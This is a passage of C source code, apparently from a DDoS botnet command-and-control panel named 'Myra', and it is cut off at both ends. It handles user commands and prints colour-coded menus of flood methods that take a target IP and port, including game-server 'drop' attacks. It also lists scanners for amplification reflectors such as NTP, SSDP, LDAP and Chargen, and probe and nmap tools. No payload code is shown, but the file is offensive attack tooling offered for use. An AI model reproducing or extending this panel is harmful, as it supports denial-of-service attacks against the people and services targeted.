      //TESTICLESpthread_create(&title, NULL, &myra_title_creator, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
      while (1)
      {
        sprintf(myra, "\e[38;5;134m[\e[38;5;225m%s\e[38;5;134m@\e[38;5;168mMyra\e[38;5;134m]\e[38;5;154m$\e[38;5;168m ", accounts[find_line].username, myra_buffer_size); // User Input - Hostname
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break;                 // World Break!
      }
      continue;
    }
    if (strstr(myra_buffer_size, ".IPHM") || strstr(myra_buffer_size, ".iphm")) // Help Command - Displays Help Menu
    {
      char iphm_method1[5000]; // Char Every Line For Output Communication
      sprintf(iphm_method1, "\e[38;5;225mThis menu will be added one the IPMI menu is finished.\r\n");
      if (send(clear_myra_broadcast, iphm_method1, strlen(iphm_method1), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      //TESTICLESpthread_create(&title, NULL, &myra_title_creator, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
      while (1)
      {
        sprintf(myra, "\e[38;5;134m[\e[38;5;225m%s\e[38;5;134m@\e[38;5;168mMyra\e[38;5;134m]\e[38;5;154m$\e[38;5;168m ", accounts[find_line].username, myra_buffer_size); // User Input - Hostname
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break;                 // World Break!
      }
      continue;
    }
    if (strstr(myra_buffer_size, ".IPMI") || strstr(myra_buffer_size, ".ipmi")) // Help Command - Displays Help Menu
    {
      char ipmi_method01[5000];
      char ipmi_method02[5000];
      char ipmi_method03[5000];
      char ipmi_method04[5000];
      char ipmi_method05[5000];
      char ipmi_method06[5000];
      char ipmi_method07[5000];
      char ipmi_method08[5000];
      char ipmi_method09[5000];
      char ipmi_method10[5000];
      char ipmi_method11[5000];
      char ipmi_method12[5000];
      char ipmi_method13[5000];
      char ipmi_method14[5000];
      char ipmi_method15[5000];
      char ipmi_method16[5000];
      char ipmi_method17[5000];
      char ipmi_method18[5000];
      char ipmi_method19[5000];
      char ipmi_method20[5000];
      char ipmi_method21[5000];
      char ipmi_method22[5000];
      char ipmi_method23[5000];
      sprintf(ipmi_method01, "\e[38;5;225m╔════════════════════════╗ ╔════════════════════════╗ ╔════════════════════════╗\r\n");
      sprintf(ipmi_method02, "\e[38;5;225m║    \e[38;5;134mStandard-Attacks    \e[38;5;225m║ ║    \e[38;5;134mSpecial-Attacks     \e[38;5;225m║ ║  \e[38;5;134mMulti-Vector Attacks  \e[38;5;225m║\r\n");
      sprintf(ipmi_method03, "\e[38;5;225m╚════════════════════════╝ ╚════════════════════════╝ ╚════════════════════════╝\r\n");
      sprintf(ipmi_method04, "\e[38;5;225m╔════════════════════════╗ ╔════════════════════════╗ ╔════════════════════════╗\r\n");
      sprintf(ipmi_method05, "\e[38;5;225m║  \e[38;5;134m.\e[38;5;168mwitch  \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]   \e[38;5;225m║ ║  \e[38;5;134m.\e[38;5;168moryx    \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]  \e[38;5;225m║ ║  \e[38;5;134m.\e[38;5;168mmassacre \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m]        \e[38;5;225m║\r\n");
      sprintf(ipmi_method06, "\e[38;5;225m║  \e[38;5;134m.\e[38;5;168mhome   \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]   \e[38;5;225m║ ║  \e[38;5;134m.\e[38;5;168mphoenix \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]  \e[38;5;225m║ ║  \e[38;5;134m.\e[38;5;168mxxxxxxxx \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m] \e[38;5;225m║\r\n");
      sprintf(ipmi_method07, "\e[38;5;225m║  \e[38;5;134m.\e[38;5;168mosiris \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]   \e[38;5;225m║ ║  \e[38;5;134m.\e[38;5;168mgunther \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]  \e[38;5;225m║ ║  \e[38;5;134m.\e[38;5;168mxxxxxxxx \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m] \e[38;5;225m║\r\n");
      sprintf(ipmi_method08, "\e[38;5;225m║  \e[38;5;134m.\e[38;5;168mkratos \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]   \e[38;5;225m║ ╚════════════════════════╝ ║  \e[38;5;134m.\e[38;5;168mxxxxxxxx \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m] \e[38;5;225m║\r\n");
      sprintf(ipmi_method09, "\e[38;5;225m║  \e[38;5;134m.\e[38;5;168modin   \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]   \e[38;5;225m║ ╔════════════════════════╗ ║  \e[38;5;134m.\e[38;5;168mxxxxxxxx \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m] \e[38;5;225m║\r\n");
      sprintf(ipmi_method10, "\e[38;5;225m╚════════════════════════╝ ╚════════════════════════╝ ╚════════════════════════╝\r\n");
      sprintf(ipmi_method11, "\e[38;5;225m╔════════════════════════╗ ╔════════════════════════╗ ╔════════════════════════╗\r\n");
      sprintf(ipmi_method12, "\e[38;5;225m║      \e[38;5;134mGame-Attacks      \e[38;5;225m║ ║      \e[38;5;134mxxxxxxxxxxxx      \e[38;5;225m║ ║      \e[38;5;134mxxxxxxxxxxxx      \e[38;5;225m║\r\n");
      sprintf(ipmi_method13, "\e[38;5;225m╚════════════════════════╝ ╚════════════════════════╝ ╚════════════════════════╝\r\n");
      sprintf(ipmi_method14, "\e[38;5;225m╔════════════════════════╗ ╔════════════════════════╗ ╔════════════════════════╗\r\n");
      sprintf(ipmi_method15, "\e[38;5;225m║  \e[38;5;134m.\e[38;5;168mfn-drop  \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m] \e[38;5;225m║ ║  \e[38;5;134m.\e[38;5;168mxxxxxxx \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]  \e[38;5;225m║ ║  \e[38;5;134m.\e[38;5;168mxxxxxxx \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]  \e[38;5;225m║\r\n");
      sprintf(ipmi_method16, "\e[38;5;225m║  \e[38;5;134m.\e[38;5;168mr6-drop  \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m] \e[38;5;225m║ ║  \e[38;5;134m.\e[38;5;168mxxxxxxx \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]  \e[38;5;225m║ ║  \e[38;5;134m.\e[38;5;168mxxxxxxx \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]  \e[38;5;225m║\r\n");
      sprintf(ipmi_method17, "\e[38;5;225m║  \e[38;5;134m.\e[38;5;168mark-drop \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m] \e[38;5;225m║ ║  \e[38;5;134m.\e[38;5;168mxxxxxxx \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]  \e[38;5;225m║ ║  \e[38;5;134m.\e[38;5;168mxxxxxxx \e[38;5;134m[\e[38;5;168mIP\e[38;5;134m] [\e[38;5;168mPORT\e[38;5;134m]  \e[38;5;225m║\r\n");
      sprintf(ipmi_method18, "\e[38;5;225m╚════════════════════════╝ ╚════════════════════════╝ ╚════════════════════════╝\r\n");
      sprintf(ipmi_method19, "\e[38;5;225m╔════════════════════════╗ ╔═══════════════════════════════════════════════════╗\r\n");
      sprintf(ipmi_method20, "\e[38;5;225m║ \e[38;5;225mMyra \e[38;5;168mV\e[38;5;225m. \e[38;5;168mAttack Menu\e[38;5;168m.   \e[38;5;225m║ ║ \e[38;5;168mThis \e[38;5;134mmenu \e[38;5;168mis ongoing progress \e[38;5;134m!                   \e[38;5;225m║\r\n");
      sprintf(ipmi_method21, "\e[38;5;225m║ \e[38;5;134mVersion \e[38;5;168mIII \e[38;5;134m[\e[38;5;168mBETA\e[38;5;134m]\e[38;5;168m.    \e[38;5;225m║ ║ \e[38;5;168mThis will be updated daily with new methods.      \e[38;5;225m║\r\n");
      sprintf(ipmi_method22, "\e[38;5;225m║ \e[38;5;134mSemi\e[38;5;168m-\e[38;5;134mRelease\e[38;5;168m.          \e[38;5;225m║ ║ \e[38;5;134mGame-Attacks \e[38;5;168mare currently \e[38;5;134mNOT \e[38;5;168mworking\e[38;5;134m.           \e[38;5;225m║\r\n");
      sprintf(ipmi_method23, "\e[38;5;225m╚════════════════════════╝ ╚═══════════════════════════════════════════════════╝\r\n");
      if (send(clear_myra_broadcast, ipmi_method01, strlen(ipmi_method01), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method02, strlen(ipmi_method02), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method03, strlen(ipmi_method03), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method04, strlen(ipmi_method04), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method05, strlen(ipmi_method05), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method06, strlen(ipmi_method06), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method07, strlen(ipmi_method07), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method08, strlen(ipmi_method08), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method09, strlen(ipmi_method09), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method10, strlen(ipmi_method10), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method11, strlen(ipmi_method11), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method12, strlen(ipmi_method12), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method13, strlen(ipmi_method13), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method14, strlen(ipmi_method14), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method15, strlen(ipmi_method15), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method16, strlen(ipmi_method16), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method17, strlen(ipmi_method17), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method18, strlen(ipmi_method18), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method19, strlen(ipmi_method19), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method20, strlen(ipmi_method20), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method21, strlen(ipmi_method21), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method22, strlen(ipmi_method22), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, ipmi_method23, strlen(ipmi_method23), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      //char menuoutput[5000];
      //sprintf(menuoutput,  "\e[38;5;225mWait until the \e[38;5;134mfull release \e[38;5;168m!\r\n");
      //if(send(clear_myra_broadcast, menuoutput, strlen(menuoutput),   MSG_NOSIGNAL) == -1) goto finish_integer;
      //TESTICLESpthread_create(&title, NULL, &myra_title_creator, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
      while (1)
      {
        sprintf(myra, "\e[38;5;134m[\e[38;5;225m%s\e[38;5;134m@\e[38;5;168mMyra\e[38;5;134m]\e[38;5;154m$\e[38;5;168m ", accounts[find_line].username, myra_buffer_size); // User Input - Hostname
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break;                 // World Break!
      }
      continue;
    }
    if (strstr(myra_buffer_size, ".scanner") || strstr(myra_buffer_size, ".SCANNER")) // Help Command - Displays Help Menu
    {
      char scanner_1[5000]; // Char Every Line For Output Communication
      sprintf(scanner_1, "\e[38;5;225m╔═════════════════════════╗\r\n\e[38;5;225m║ \e[38;5;168mMyra I \e[38;5;225m- \e[38;5;168mIPHMScanners \e[38;5;225m║\r\n\e[38;5;225m╠═════════════════════════╣ ╔═════════════════╗\r\n\e[38;5;225m║ \e[38;5;168m.lds \e[38;5;134mon   \e[38;5;225m||  \e[38;5;168m.lds \e[38;5;134moff  \e[38;5;225m║ ║ \e[38;5;168mLDAP Scanner    \e[38;5;225m║\r\n\e[38;5;225m║ \e[38;5;168m.nts \e[38;5;134mon   \e[38;5;225m||  \e[38;5;168m.nts \e[38;5;134moff  \e[38;5;225m║ ║ \e[38;5;168mNTP Scanner     \e[38;5;225m║\r\n\e[38;5;225m║ \e[38;5;168m.tfs \e[38;5;134mon   \e[38;5;225m||  \e[38;5;168m.tfs \e[38;5;134moff  \e[38;5;225m║ ║ \e[38;5;168mTFTP Scanner    \e[38;5;225m║\r\n\e[38;5;225m║ \e[38;5;168m.sds \e[38;5;134mon   \e[38;5;225m||  \e[38;5;168m.sds \e[38;5;134moff  \e[38;5;225m║ ║ \e[38;5;168mSSDP Scanner    \e[38;5;225m║\r\n\e[38;5;225m║ \e[38;5;168m.pos \e[38;5;134mon   \e[38;5;225m||  \e[38;5;168m.pos \e[38;5;134moff  \e[38;5;225m║ ║ \e[38;5;168mPortmap Scanner \e[38;5;225m║\r\n\e[38;5;225m║ \e[38;5;168m.cos \e[38;5;134mon   \e[38;5;225m||  \e[38;5;168m.cos \e[38;5;134moff  \e[38;5;225m║ ║ \e[38;5;168mChargen Scanner \e[38;5;225m║\r\n\e[38;5;225m║ \e[38;5;168m.sos \e[38;5;134mon   \e[38;5;225m||  \e[38;5;168m.sos \e[38;5;134moff  \e[38;5;225m║ ║ \e[38;5;168mSentinel Scanner\e[38;5;225m║\r\n\e[38;5;225m║ \e[38;5;168m.nes \e[38;5;134mon   \e[38;5;225m||  \e[38;5;168m.nes \e[38;5;134moff  \e[38;5;225m║ ║ \e[38;5;168mNetBios Scanner \e[38;5;225m║\r\n\e[38;5;225m║ \e[38;5;168m.mss \e[38;5;134mon   \e[38;5;225m||  \e[38;5;168m.mss \e[38;5;134moff  \e[38;5;225m║ ║ \e[38;5;168mMSSQL Scanner   \e[38;5;225m║\r\n\e[38;5;225m║ \e[38;5;168m.tss \e[38;5;134mon   \e[38;5;225m||  \e[38;5;168m.tss \e[38;5;134moff  \e[38;5;225m║ ║ \e[38;5;168mTS3 Scanner     \e[38;5;225m║\r\n\e[38;5;225m╚═════════════════════════╝ ╚═════════════════╝\r\n");
      if (send(clear_myra_broadcast, scanner_1, strlen(scanner_1), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      //TESTICLESpthread_create(&title, NULL, &myra_title_creator, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
      while (1)
      {
        sprintf(myra, "\e[38;5;134m[\e[38;5;225m%s\e[38;5;134m@\e[38;5;168mMyra\e[38;5;134m]\e[38;5;154m$\e[38;5;168m ", accounts[find_line].username, myra_buffer_size); // User Input - Hostname
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break;                 // World Break!
      }
      continue;
    }
    if (strstr(myra_buffer_size, ".clear") || strstr(myra_buffer_size, ".CLEAR") || strstr(myra_buffer_size, "CLEAR") || strstr(myra_buffer_size, "clear")) // Clear The Screen - We Love Cleanliness
    {
      if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main01, strlen(main01), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main02, strlen(main02), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main03, strlen(main03), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main04, strlen(main04), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main05, strlen(main05), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main06, strlen(main06), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main07, strlen(main07), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main08, strlen(main08), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main09, strlen(main09), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main10, strlen(main10), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main11, strlen(main11), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main12, strlen(main12), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main13, strlen(main13), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main14, strlen(main14), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main15, strlen(main15), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main16, strlen(main16), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main17, strlen(main17), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main18, strlen(main18), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main19, strlen(main19), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main20, strlen(main20), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main21, strlen(main21), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main22, strlen(main22), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, main23, strlen(main23), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      //TESTICLESpthread_create(&title, NULL, &myra_title_creator, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
      while (1)
      {
        sprintf(myra, "\e[38;5;134m[\e[38;5;225m%s\e[38;5;134m@\e[38;5;168mMyra\e[38;5;134m]\e[38;5;154m$\e[38;5;168m ", accounts[find_line].username, myra_buffer_size); // User Input [Hostname]
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break;                 // World Break!
      }
      continue;
    }
    if (strstr(myra_buffer_size, ".STRESS") || strstr(myra_buffer_size, ".stress")) // Display Menu - Stress Menu
    {
      char method_1[5000]; // Char Every Line For Output Communication
      sprintf(method_1, "This has been disabled.\r\n");
      // Crush, Junk, Stomp > Taken Out Lynx -- Unstable And Causes Some Define Allocation Errors - [Will Be Fixed In ALpha]
      if (send(clear_myra_broadcast, method_1, strlen(method_1), MSG_NOSIGNAL) == -1)
        goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      //TESTICLESpthread_create(&title, NULL, &myra_title_creator, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
      while (1)
      {
        sprintf(myra, "\e[38;5;134m[\e[38;5;225m%s\e[38;5;134m@\e[38;5;168mMyra\e[38;5;134m]\e[38;5;154m$\e[38;5;168m ", accounts[find_line].username, myra_buffer_size); // User Input - Hostname
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break;                 // World Break!
      }
      continue; // Yep...
    }
    if (strstr(myra_buffer_size, ".update") || strstr(myra_buffer_size, ".UPDATE")) // Staff Only ! - Display Menu
    {
      //TESTICLESpthread_create(&title, NULL, &myra_title_creator, sock);
      char staff_cmd1[5000]; // Char Every Line For Output Communication
      sprintf(staff_cmd1, "\e[38;5;225mThis will be added when Substrate is compatible.\r\n");
      if (send(clear_myra_broadcast, staff_cmd1, strlen(staff_cmd1), MSG_NOSIGNAL) == -1)
        goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      //TESTICLESpthread_create(&title, NULL, &myra_title_creator, sock); // Use Pthread, To Broadcast Signal, MSG_NOSIGNAL Should Be == 0
      while (1)
      {
        sprintf(myra, "\e[38;5;134m[\e[38;5;225m%s\e[38;5;134m@\e[38;5;168mMyra\e[38;5;134m]\e[38;5;154m$\e[38;5;168m ", accounts[find_line].username, myra_buffer_size); // User Input - Hostname
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break;                 // Terminate Connection.. Reinstate All Functions.
      }
      continue; // Let Us Continue.. We Are Nearly There..
    }
    if (strstr(myra_buffer_size, ".tools") || strstr(myra_buffer_size, ".TOOLS") || strstr(myra_buffer_size, ".tool") || strstr(myra_buffer_size, ".TOOL")) // Display Menu - Tools
    {
      //TESTICLESpthread_create(&title, NULL, &myra_title_creator, sock);
      char tools_menu01[5000];
      char tools_menu02[5000];
      char tools_menu03[5000];
      char tools_menu04[5000];
      char tools_menu05[5000];
      char tools_menu06[5000];
      char tools_menu07[5000];
      char tools_menu08[5000];
      char tools_menu09[5000];
      char tools_menu10[5000];
      char tools_menu11[5000];
      char tools_menu12[5000];
      char tools_menu13[5000];
      char tools_menu14[5000];
      char tools_menu15[5000];
      char tools_menu16[5000];
      char tools_menu17[5000];
      char tools_menu18[5000];
      char tools_menu19[5000];
      char tools_menu20[5000];
      char tools_menu21[5000];
      char tools_menu22[5000];
      char tools_menu23[5000];
      sprintf(tools_menu01, "\e[38;5;225m╔═════════════════════════╗╔═══════════════════════════════════════════════════╗\r\n");
      sprintf(tools_menu02, "\e[38;5;225m║ \e[38;5;134mMyra \e[38;5;168mV\e[38;5;134m.  \e[38;5;134mUser Tools\e[38;5;168m.    \e[38;5;225m║╚═══════════════════════════════════════════════════╝\r\n");
      sprintf(tools_menu03, "\e[38;5;225m╚═════════════════════════╝╔═════════════════╗             ╔═══════════════════╗\r\n");
      sprintf(tools_menu04, "\e[38;5;225m╔═══════════════════╗      ║ \e[38;5;134mPing Commands\e[38;5;168m.  \e[38;5;225m║    ╔════╗   ║ \e[38;5;168mUD_PRB\e[38;5;134m..\e[38;5;168m: \e[38;5;134mON \e[38;5;168m!    \e[38;5;225m║\r\n");
      sprintf(tools_menu05, "\e[38;5;225m║ \e[38;5;134mPing Probes Types \e[38;5;225m║      ║ \e[38;5;168mII\e[38;5;134m.             \e[38;5;225m║    ║ \e[38;5;134mII \e[38;5;225m║   ║ \e[38;5;168mTC_PRB\e[38;5;134m..\e[38;5;168m: \e[38;5;134mON \e[38;5;168m! \e[38;5;225m   ║\r\n");
      sprintf(tools_menu06, "\e[38;5;225m╚═══════════════════╝      ╚═════════════════╝    ╚════╝   ║ \e[38;5;168mAR_PRB\e[38;5;134m..\e[38;5;168m: \e[38;5;134mON \e[38;5;168m! \e[38;5;225m   ║\r\n");
      sprintf(tools_menu07, "\e[38;5;225m╔═════════════════════════╗╔══════════════════════════════╗║ \e[38;5;168mIC_PRB\e[38;5;134m..\e[38;5;168m: \e[38;5;134mON \e[38;5;168m! \e[38;5;225m   ║\r\n");
      sprintf(tools_menu08, "\e[38;5;225m║ \e[38;5;134m.\e[38;5;168mtcp-ping  \e[38;5;225m[\e[38;5;168mPORT\e[38;5;225m] [\e[38;5;168mIP\e[38;5;225m]  ║║ \e[38;5;168mInitiates \e[38;5;134mTCP \e[38;5;168mProbe Ping\e[38;5;134m.    \e[38;5;225m║║ \e[38;5;168mUDADV_PRB\e[38;5;134m..\e[38;5;168m: \e[38;5;134mON \e[38;5;168m! \e[38;5;225m║\r\n");
      sprintf(tools_menu09, "\e[38;5;225m║ \e[38;5;134m.\e[38;5;168mudp-ping  \e[38;5;225m[\e[38;5;168mPORT\e[38;5;225m] [\e[38;5;168mIP\e[38;5;225m]  ║║ \e[38;5;168mInitiates \e[38;5;134mUDP \e[38;5;168mProbe Ping\e[38;5;134m.    \e[38;5;225m║║ \e[38;5;168mTCADV_PRB\e[38;5;134m..\e[38;5;168m: \e[38;5;134mON \e[38;5;168m! \e[38;5;225m║\r\n");
      sprintf(tools_menu10, "\e[38;5;225m║ \e[38;5;134m.\e[38;5;168marp-ping  \e[38;5;225m[\e[38;5;168mIP\e[38;5;225m]         ║║ \e[38;5;168mInitiates \e[38;5;134mARP \e[38;5;168mProbe Ping\e[38;5;134m.    \e[38;5;225m║║ \e[38;5;168mARADV_PRB\e[38;5;134m..\e[38;5;168m: \e[38;5;134mON \e[38;5;168m! \e[38;5;225m║\r\n");
      sprintf(tools_menu11, "\e[38;5;225m║ \e[38;5;134m.\e[38;5;168micmp-ping \e[38;5;225m[\e[38;5;168mIP\e[38;5;225m]         ║║ \e[38;5;168mInitiates \e[38;5;134mICMP\e[38;5;168m Probe Ping\e[38;5;134m.   \e[38;5;225m║║ \e[38;5;168mICADV_PRB\e[38;5;134m..\e[38;5;168m: \e[38;5;134mON \e[38;5;168m! \e[38;5;225m║\r\n");
      sprintf(tools_menu12, "\e[38;5;225m╚═════════════════════════╝╚══════════════════════════════╝╚═══════════════════╝\r\n");
      sprintf(tools_menu13, "\e[38;5;225m╔════════════════════════════╗╔════════════════════════════════════════════════╗\r\n");
      sprintf(tools_menu14, "\e[38;5;225m║ \e[38;5;134m.\e[38;5;168mtcpadv-ping  \e[38;5;225m[\e[38;5;168mPORT\e[38;5;225m] [\e[38;5;168mIP\e[38;5;225m]  ║║ \e[38;5;168mInitiates Advanced \e[38;5;134mTCP \e[38;5;168mProbe For \e[38;5;134mPacket Debug\e[38;5;168m. \e[38;5;225m║\r\n");
      sprintf(tools_menu15, "\e[38;5;225m║ \e[38;5;134m.\e[38;5;168mudpadv-ping  \e[38;5;225m[\e[38;5;168mPORT\e[38;5;225m] [\e[38;5;168mIP\e[38;5;225m]  ║║ \e[38;5;168mInitiates Advanced \e[38;5;134mUDP \e[38;5;168mProbe For \e[38;5;134mRTE Analysis\e[38;5;168m. \e[38;5;225m║\r\n");
      sprintf(tools_menu16, "\e[38;5;225m║ \e[38;5;134m.\e[38;5;168marpadv-ping  \e[38;5;225m[\e[38;5;168mIP\e[38;5;225m]         ║║ \e[38;5;168mInitiates Advanced \e[38;5;134mARP \e[38;5;168mProbe For \e[38;5;134mADR Testing\e[38;5;168m.  \e[38;5;225m║\r\n");
      sprintf(tools_menu17, "\e[38;5;225m║ \e[38;5;134m.\e[38;5;168micmpadv-ping \e[38;5;225m[\e[38;5;168mIP\e[38;5;225m]         ║║ \e[38;5;168mInitiates Advanced \e[38;5;134mICMP\e[38;5;168m Probe For\e[38;5;134m Verbosity\e[38;5;168m.   \e[38;5;225m║\r\n");
      sprintf(tools_menu18, "\e[38;5;225m╚════════════════════════════╝╚════════════════════════════════════════════════╝\r\n");
      sprintf(tools_menu19, "\e[38;5;225m╔══════════════════════╗╔══════════════════════════════════════════════════════╗\r\n");
      sprintf(tools_menu20, "\e[38;5;225m║ \e[38;5;134m.\e[38;5;168miplookup \e[38;5;225m[\e[38;5;168mIP\e[38;5;225m]       ║║ \e[38;5;168mDisplays Information Such as \e[38;5;134mGeolocation \e[38;5;168mFor a IP\e[38;5;134m.   \e[38;5;225m║\r\n");
      sprintf(tools_menu21, "\e[38;5;225m║ \e[38;5;134m.\e[38;5;168mnmap     \e[38;5;225m[\e[38;5;168mIP\e[38;5;225m]       ║║ \e[38;5;168mInitiates \e[38;5;134mNMAP \e[38;5;168mTo Run a Full Fledged Port Scan\e[38;5;134m.      \e[38;5;225m║\r\n");
      sprintf(tools_menu22, "\e[38;5;225m║ \e[38;5;134m.\e[38;5;168mwhois    \e[38;5;225m[\e[38;5;168mIP\e[38;5;225m]       ║║ \e[38;5;168mRuns a \e[38;5;134mWHOIS \e[38;5;168mSearch on Stated IP Address\e[38;5;134m.            \e[38;5;225m║\r\n");
